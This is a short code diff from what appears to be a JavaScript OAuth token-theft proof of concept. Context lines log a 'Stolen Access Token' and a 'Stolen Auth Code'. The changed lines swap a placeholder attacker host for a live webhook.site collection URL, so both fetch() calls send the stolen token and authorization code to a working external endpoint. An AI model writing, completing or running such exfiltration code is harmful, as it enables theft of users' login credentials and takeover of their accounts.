@@ -52,7 +52,7 @@
           console.log('Stolen Access Token:', stolenToken);
 
           // Exfiltrate to attacker’s server
-          fetch('https://evil.example/log?token=' + encodeURIComponent(stolenToken));
+          fetch('https://webhook.site/38cf651e-7639-4396-bb48-92b21a547ba2?token=' + encodeURIComponent(stolenToken));
 
           // Optionally close the popup
           popup.close();
@@ -62,7 +62,7 @@
           console.log('Stolen Auth Code:', stolenCode);
 
           // Exfiltrate to attacker’s server
-          fetch('https://evil.example/log?code=' + encodeURIComponent(stolenCode));
+          fetch('https://webhook.site/38cf651e-7639-4396-bb48-92b21a547ba2?code=' + encodeURIComponent(stolenCode));
 
           popup.close();
         }
